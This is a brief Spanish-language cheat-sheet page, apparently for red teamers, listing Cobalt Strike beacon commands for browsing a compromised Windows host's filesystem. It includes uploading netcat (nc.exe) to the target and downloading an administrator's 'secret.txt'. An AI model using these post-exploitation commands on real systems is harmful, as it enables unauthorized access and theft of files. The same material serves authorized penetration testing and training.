---
title: Cobalt Strike — Sistema de Ficheros
tags: [cobalt-strike, post-ex, filesystem]
---

# Sistema de Ficheros

## Listar unidades disponibles

```
beacon> drives
```

## Explorar sistema de ficheros (GUI)

```
beacon> file_browser
```

O desde el menú: **Explore → File Browser**

## Comandos básicos

```
beacon> ls C:\Users
beacon> cd C:\Users\Administrator
beacon> pwd
beacon> mkdir C:\Temp\test
beacon> rm C:\Temp\test\file.txt
```

## Upload / Download

```
beacon> upload C:\Tools\nc.exe
beacon> download C:\Users\Administrator\secret.txt
```
